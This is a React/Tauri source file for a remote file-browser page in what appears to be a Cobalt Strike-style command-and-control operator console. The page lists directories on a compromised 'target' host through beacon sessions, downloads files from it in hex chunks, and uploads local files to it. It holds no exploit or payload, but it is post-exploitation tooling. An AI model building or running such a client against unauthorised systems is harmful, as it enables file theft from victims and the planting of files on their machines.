/**
 * FilesPage — 远程文件浏览器(CS 风格)。
 *
 * 背景:中文靶机上 shell 跑 ls/pwd 全是坑(GBK 乱码、cmd 的 cd 不持久),
 * 这里直接走 fileop/download/upload 结构命令,operator 不再手输命令。
 *
 * 数据流:
 *   - 进入页面 / 路径变化 → sendCommand(fileop ls),任务进全局队列;
 *   - onResult 按 (session_id, task_id) 匹配自己的 ls 结果,parseLsLines 成行;
 *     同一结果也会进全局 TaskStore 控制台,这是预期,不拦截;
 *   - download 的 file 分块(seq/eof)按 task_id 聚合,eof 落地后拼 Blob
 *     触发浏览器 a[download] 下载(模式同 TaskBlock 的 FileDownloadView);
 *   - 上传走 pick_file → read_file_hex → upload(name=当前路径\文件名),
 *     与 CommandInput 的「选择文件」同一套 invoke。
 */
import { useCallback, useEffect, useRef, useState } from 'react';
import { invoke } from '@tauri-apps/api/core';
import type { UnlistenFn } from '@tauri-apps/api/event';
import type { ResultView, SessionView } from '../lib/types';
import { onResult, sendCommand } from '../lib/invoke';
import { parseLsLines, type FileEntry } from '../components/FileTable';
import './FilesPage.css';

export interface FilesPageProps {
  /** 当前选中的会话(App 层 selectedId 解析而来);null 时显示空态。 */
  session: SessionView | null;
}

/** 进行中的下载(task_id → 状态)。 */
interface DownloadState {
  name: string;
  bytes: number;
  done: boolean;
  error?: string;
}

/** Windows / POSIX 混合的路径拼接(与 TaskBlock 的 resolveLsPath 同规则)。 */
function joinPath(base: string, name: string): string {
  if (/[\\/]$/.test(base)) return base + name;
  const sep = base.includes('\\') ? '\\' : '/';
  return base + sep + name;
}

/** 上级目录;已在根(盘符 / /)时原样返回。 */
function parentPath(p: string): string {
  const trimmed = p.replace(/[\\/]+$/, '');
  const idx = Math.max(trimmed.lastIndexOf('\\'), trimmed.lastIndexOf('/'));
  if (idx <= 0) return p;
  const parent = trimmed.slice(0, idx);
  // 盘符根:C: → C:\
  if (/^[A-Za-z]:$/.test(parent)) return parent + '\\';
  return parent || p;
}

/** hex → bytes(server 保证合法 hex;TaskBlock 里有同款,未导出,这里自带一份)。 */
function hexToBytes(hex: string): Uint8Array {
  const out = new Uint8Array(hex.length / 2);
  for (let i = 0; i < out.length; i++) {
    out[i] = parseInt(hex.slice(i * 2, i * 2 + 2), 16);
  }
  return out;
}

/** 分块聚合成 Blob 并触发浏览器下载。 */
function saveChunks(chunks: ResultView[], name: string) {
  const ordered = [...chunks].sort((a, b) => (a.seq ?? 0) - (b.seq ?? 0));
  const hex = ordered.map((c) => c.data_hex ?? '').join('');
  const bytes = hexToBytes(hex);
  // TS 5.7+ lib 类型里 Uint8Array<ArrayBufferLike> 不可赋给 BlobPart,运行时是普通 Uint8Array。
  const blob = new Blob([bytes as BlobPart], { type: 'application/octet-stream' });
  const url = URL.createObjectURL(blob);
  const a = document.createElement('a');
  a.href = url;
  a.download = name;
  document.body.appendChild(a);
  a.click();
  a.remove();
  // 延迟回收:click 的下载抓取是异步的,立即 revoke 会拿到 0 字节文件。
  setTimeout(() => URL.revokeObjectURL(url), 10_000);
}

export function FilesPage({ session }: FilesPageProps) {
  const [path, setPath] = useState('C:\\');
  // 路径栏的编辑草稿(回车才生效,避免每敲一个字符发一次 ls)。
  const [draft, setDraft] = useState('C:\\');
  const [entries, setEntries] = useState<FileEntry[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [downloads, setDownloads] = useState<Record<number, DownloadState>>({});
  const [uploadBusy, setUploadBusy] = useState(false);
  const [uploadMsg, setUploadMsg] = useState('');

  // 当前等待回包的 ls task_id;路径切换后旧任务的结果直接忽略。
  const lsTaskRef = useRef<number | null>(null);
  // 下载分块暂存:task_id → chunks / 文件名。
  const dlChunksRef = useRef(new Map<number, ResultView[]>());
  const dlNameRef = useRef(new Map<number, string>());

  /** 下发 ls;路径变化 / 手动刷新都走这里。 */
  const refresh = useCallback(
    async (p: string) => {
      if (!session) return;
      setLoading(true);
      setError(null);
      try {
        const id = await sendCommand(
          session.id,
          { type: 'fileop', op: 'ls', path: p },
          `ls ${p}`,
        );
        lsTaskRef.current = id;
      } catch (e) {
        lsTaskRef.current = null;
        setLoading(false);
        setError(e instanceof Error ? e.message : String(e));
      }
    },
    [session],
  );

  // 进入页面 / 换会话 / 路径变化:自动 ls 当前路径。
  useEffect(() => {
    setEntries([]);
    setDownloads({});
    dlChunksRef.current.clear();
    dlNameRef.current.clear();
    lsTaskRef.current = null;
    void refresh(path);
  }, [session, path, refresh]);

  // 订阅结果事件:按 (session_id, task_id) 路由到 ls / 下载两条线。
  useEffect(() => {
    if (!session) return;
    let unlisten: UnlistenFn | null = null;
    let cancelled = false;
    onResult((r) => {
      if (r.session_id !== session.id) return;

      // --- ls 回包:只认当前 pending 的那个 task ---
      if (lsTaskRef.current !== null && r.task_id === lsTaskRef.current) {
        if (r.kind === 'output') {
          setEntries(parseLsLines(r.text.split('\n')));
          setError(null);
        } else if (r.kind === 'error') {
          setError(r.text);
        } else {
          // ok 等其他 kind:不作为目录数据,但结束 loading。
          if (r.kind !== 'ok') setError(`[${r.kind}] ${r.text}`);
        }
        setLoading(false);
        lsTaskRef.current = null;
        return;
      }

      // --- download 分块:file 按 seq 聚合,error 标记失败 ---
      if (!dlChunksRef.current.has(r.task_id)) return;
      if (r.kind === 'error') {
        dlChunksRef.current.delete(r.task_id);
        dlNameRef.current.delete(r.task_id);
        setDownloads((prev) => ({
          ...prev,
          [r.task_id]: { ...prev[r.task_id], error: r.text, done: true },
        }));
        return;
      }
      if (r.kind !== 'file') return;
      const chunks = dlChunksRef.current.get(r.task_id)!;
      chunks.push(r);
      const bytes = chunks.reduce((n, c) => n + (c.data_hex ? c.data_hex.length / 2 : 0), 0);
      const done = r.eof === 1;
      setDownloads((prev) => ({
        ...prev,
        [r.task_id]: { ...prev[r.task_id], bytes, done },
      }));
      if (done) {
        const name = dlNameRef.current.get(r.task_id) ?? 'download';
        saveChunks(chunks, name);
        dlChunksRef.current.delete(r.task_id);
        dlNameRef.current.delete(r.task_id);
      }
    }).then((fn) => {
      if (cancelled) fn();
      else unlisten = fn;
    });
    return () => {
      cancelled = true;
      if (unlisten) unlisten();
    };
  }, [session]);

  /** 应用路径栏草稿(回车 / 「转到」按钮)。 */
  function applyDraft() {
    const p = draft.trim();
    if (!p || p === path) return;
    setPath(p);
  }

  function enterDir(name: string) {
    const p = joinPath(path, name);
    setDraft(p);
    setPath(p);
  }

  function goUp() {
    const p = parentPath(path);
    if (p === path) return;
    setDraft(p);
    setPath(p);
  }

  /** 文件行「下载」:发 download 命令,分块由 onResult 那条线聚合。 */
  async function startDownload(name: string) {
    if (!session) return;
    const full = joinPath(path, name);
    setError(null);
    try {
      const id = await sendCommand(session.id, { type: 'download', path: full }, `download ${full}`);
      dlChunksRef.current.set(id, []);
      dlNameRef.current.set(id, name);
      setDownloads((prev) => ({ ...prev, [id]: { name, bytes: 0, done: false } }));
    } catch (e) {
      setError(e instanceof Error ? e.message : String(e));
    }
  }

  /** 「上传到此目录」:pick_file → read_file_hex → upload(name=当前路径\文件名)。 */
  async function handleUpload() {
    if (!session || uploadBusy) return;
    setError(null);
    setUploadMsg('');
    try {
      const local = await invoke<string | null>('pick_file', {
        title: '选择要上传的文件',
        filters: [],
      });
      if (!local) return; // 用户取消
      const hex = await invoke<string>('read_file_hex', { path: local });
      const fileName = local.split(/[\\/]/).pop() || local;
      const remote = joinPath(path, fileName);
      setUploadBusy(true);
      await sendCommand(session.id, { type: 'upload', name: remote, data_hex: hex }, `upload ${remote}`);
      setUploadMsg(`已下发 upload ${fileName}(${hex.length / 2} 字节),完成后点「刷新」确认`);
    } catch (e) {
      setError(e instanceof Error ? e.message : String(e));
    } finally {
      setUploadBusy(false);
    }
  }

  if (!session) {
    return (
      <div className="files-page">
        <div className="fp-empty">
          <p>未选择会话。</p>
          <p className="fp-empty-sub">先在「工作区」选一个在线 session,再回来浏览它的文件。</p>
        </div>
      </div>
    );
  }

  const activeDownloads = Object.entries(downloads);

  return (
    <div className="files-page">
      {/* ---- 顶部:标题 + 路径栏 + 操作按钮 ---- */}
      <div className="fp-header">
        <div className="fp-title-group">
          <span className="fp-title">文件</span>
          <span className="fp-host mono">
            {session.hostname} · {session.username}
          </span>
        </div>
        <div className="fp-pathbar">
          <button type="button" className="fp-btn" onClick={goUp} title="上级目录">
            ↑ 上级
          </button>
          <input
            className="fp-path mono"
            value={draft}
            spellCheck={false}
            autoComplete="off"
            onChange={(e) => setDraft(e.target.value)}
            onKeyDown={(e) => {
              if (e.key === 'Enter') {
                e.preventDefault();
                applyDraft();
              }
            }}
            aria-label="远程路径"
          />
          <button type="button" className="fp-btn" onClick={applyDraft} title="转到输入的路径">
            转到
          </button>
          <button
            type="button"
            className="fp-btn"
            onClick={() => void refresh(path)}
            disabled={loading}
            title="重新 ls 当前目录"
          >
            {loading ? '…' : '⟳ 刷新'}
          </button>
          <button
            type="button"
            className="fp-btn fp-btn--accent"
            onClick={() => void handleUpload()}
            disabled={uploadBusy}
          >
            {uploadBusy ? '上传中…' : '⬆ 上传到此目录'}
          </button>
        </div>
      </div>

      {error && <div className="fp-error mono">{error}</div>}
      {uploadMsg && <div className="fp-notice mono">{uploadMsg}</div>}
      {loading && (
        <div className="fp-loading mono">ls 已下发,等待 beacon 回包(约一个 check-in 周期)…</div>
      )}

      {/* ---- 目录表:目录双击进入,文件行内「下载」 ---- */}
      <div className="fp-body">
        {entries.length === 0 && !loading ? (
          <div className="fp-empty">
            <p>{error ? '列出目录失败。' : '(空目录或无输出)'}</p>
            <p className="fp-empty-sub">可点「刷新」重试,或在路径栏输入其他路径后回车。</p>
          </div>
        ) : (
          <div className="fp-table">
            <div className="fp-row fp-row--head">
              <span className="fp-col-name">名称</span>
              <span className="fp-col-modified">修改</span>
              <span className="fp-col-size">大小</span>
              <span className="fp-col-ops" />
            </div>
            {[...entries]
              .sort((a, b) => {
                if (a.isDir !== b.isDir) return a.isDir ? -1 : 1;
                return a.name.toLowerCase().localeCompare(b.name.toLowerCase());
              })
              .map((r) => (
                <div
                  key={`${r.isDir ? 'd' : 'f'}:${r.name}`}
                  className={`fp-row${r.isDir ? ' fp-row--dir' : ''}`}
                  onDoubleClick={r.isDir ? () => enterDir(r.name) : undefined}
                  title={r.isDir ? '双击进入' : undefined}
                >
                  <span className="fp-col-name mono">
                    <span className={`fp-icon${r.isDir ? ' fp-icon--dir' : ''}`} aria-hidden>
                      {r.isDir ? '▸' : '📄'}
                    </span>
                    {r.name}
                  </span>
                  <span className="fp-col-modified mono">{r.modified}</span>
                  <span className="fp-col-size mono">{r.isDir ? '—' : r.size}</span>
                  <span className="fp-col-ops">
                    {r.isDir ? (
                      <button type="button" className="fp-op mono" onClick={() => enterDir(r.name)}>
                        进入
                      </button>
                    ) : (
                      <button
                        type="button"
                        className="fp-op mono"
                        onClick={() => void startDownload(r.name)}
                      >
                        下载
                      </button>
                    )}
                  </span>
                </div>
              ))}
          </div>
        )}
      </div>

      {/* ---- 下载进度:分块到达期间显示字节数,eof 后自动触发浏览器下载 ---- */}
      {activeDownloads.length > 0 && (
        <div className="fp-downloads">
          {activeDownloads.map(([id, d]) => (
            <div key={id} className={`fp-dl mono${d.error ? ' fp-dl--error' : ''}`}>
              {d.error
                ? `✕ ${d.name}:${d.error}`
                : d.done
                  ? `✓ ${d.name}(${d.bytes.toLocaleString()} B)— 已开始浏览器下载`
                  : `⬇ ${d.name} 接收中… ${d.bytes.toLocaleString()} B`}
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

export default FilesPage;
